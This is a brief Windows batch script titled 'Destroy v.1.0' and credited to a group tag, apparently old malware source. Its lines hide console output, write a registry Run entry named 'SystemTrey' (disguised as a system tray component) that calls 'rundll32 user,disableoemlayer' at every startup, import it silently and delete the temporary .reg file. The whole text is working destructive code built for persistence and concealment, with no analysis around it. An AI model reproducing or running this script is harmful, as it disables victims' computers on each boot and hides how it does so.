@ctty nul
;;Destroy v.1.0 by [HArM]
echo REGEDIT4>C:\t.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>C:\t.reg
echo "SystemTrey"="rundll32 user,disableoemlayer">>C:\t.reg
regedit /s C:\t.reg
del C:\t.reg


